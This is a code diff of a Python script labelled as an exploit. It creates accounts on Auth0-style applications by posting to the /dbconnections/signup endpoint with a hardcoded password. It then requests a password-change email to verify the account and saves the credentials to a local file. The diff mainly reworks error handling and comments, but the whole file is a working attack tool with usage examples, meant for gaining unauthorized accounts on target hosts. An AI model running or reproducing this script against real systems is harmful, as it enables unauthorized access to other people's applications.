@@ -1,7 +1,6 @@
 import os
 import sys
 import time
-
 import requests
 import urllib3
 
@@ -34,11 +33,10 @@ def mk_dir(host):
         path = os.path.abspath(host)  # Get absolute path of the directory
         print(f"{GREEN}[+] Directory successfully created\nPath: {path} {END}")
     except Exception as e:
-        print(f"{RED}Error occurred: {e}{END}")
+        print(f"{RED}Error occurred while creating directory: {e}{END}")
 
 # Function to exploit a vulnerability and create an account
 def exploit(host, mail):
-    # Request headers
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
@@ -52,17 +50,15 @@ def exploit(host, mail):
         'Content-Type': 'application/json',
     }
 
-    # Payload for account creation
     payload = {
         'client_id': '',
-        'email': f'{mail}',
+        'email': mail,
         'password': 'rQ8a2;3/c[<J',  # Example password
         'connection': 'Username-Password-Authentication',
     }
 
     try:
         print(f"{GREEN}[+] Initializing the exploit...{END}")
-        # Send POST request to create an account
         response = requests.post(
             f'https://{host}/dbconnections/signup',
             headers=headers,
@@ -72,51 +68,46 @@ def exploit(host, mail):
         time.sleep(0.2)  # Brief pause for better UX
 
         status_code = response.status_code
-        # Check if account creation was successful
         if status_code in [200, 201]:
             print(f"{GREEN}[+] Account successfully created\n{END}")
             print(f"{GREEN}[+] Email: {mail}\n{END}")
             print(f"{GREEN}[+] Pass: rQ8a2;3/c[<J\n{END}")
             print(f"{GREEN}[+] Status Code: {response.status_code}{END}")
             print(f"{GREEN}\n[+] Response body content: {response.text}{END}")
-            # Save credentials to a file
             with open(f"{host}/credentials.txt", "w") as file:
-                file.write(f"{payload}")
-        elif "connection" in response.json():
-            print(f"{RED}[-] Unable to find the required connection{END}")
-            print(response.text)
-        elif status_code in [404, 403]:
-            print(f"{RED}[-] The application returns: {status_code}{END}")
+                file.write(f"Email: {mail}\nPassword: rQ8a2;3/c[<J\nStatus Code: {status_code}\nResponse: {response.text}")
         else:
-            print(f"{RED}\n[-] The application is not exploitable\n {END}")
-            print(f"{RED}[-] The status code is: {status_code}{END}")
-            print("\n", response.text, "\n")
+            print(f"{RED}[-] The application returned status code: {status_code}{END}")
+            try:
+                error_json = response.json()
+                if "connection" in error_json:
+                    print(f"{RED}[-] Unable to find the required connection{END}")
+                    print(response.text)
+            except ValueError:
+                print(f"{RED}[-] The response is not JSON, response text: {response.text}{END}")
     except Exception as e:
         print(f"{RED}Error occurred: {e}{END}")
 
 # Function to verify the email address
 def mail_verify(host, mail):
-    try:
-        # Request headers
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Priority': 'u=0, i',
-            'Content-Type': 'application/json',
-        }
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Priority': 'u=0, i',
+        'Content-Type': 'application/json',
+    }
 
-        # Payload for email verification
-        payload = {
-            'email': f'{mail}',
-            'connection': 'Username-Password-Authentication'
-        }
-        # Send POST request for email verification
+    payload = {
+        'email': mail,
+        'connection': 'Username-Password-Authentication'
+    }
+    try:
         response = requests.post(
             f'https://{host}/dbconnections/change_password',
             headers=headers,
@@ -126,15 +117,20 @@ def mail_verify(host, mail):
         if response.status_code in [200, 201]:
             print(f"{GREEN}\n[+] Email verification sent to: {mail}{END}")
         else:
-            print(f"{RED}[-] Unable to verify the mail address{END}")
+            print(f"{RED}[-] Unable to verify the mail address. Status Code: {response.status_code}{END}")
+            try:
+                error_json = response.json()
+                print(f"{RED}[-] Server responded with: {error_json}{END}")
+            except ValueError:
+                print(f"{RED}[-] The response is not JSON, response text: {response.text}{END}")
     except Exception as e:
         print(f"{RED}Error occurred: {e}{END}")
 
 # Main function to handle user input and call necessary functions
 def main():
     if len(sys.argv) != 3:
-        print(f"{RED}[+] Usage: %s <host> <your_mail_address>{END}" % sys.argv[0])
-        print(f"{RED}[+] Example: %s example.com hacker@gmail.com{END}" % sys.argv[0])
+        print(f"{RED}[+] Usage: {sys.argv[0]} <host> <your_mail_address>{END}")
+        print(f"{RED}[+] Example: {sys.argv[0]} example.com hacker@gmail.com{END}")
         sys.exit(1)
 
     host = sys.argv[1]
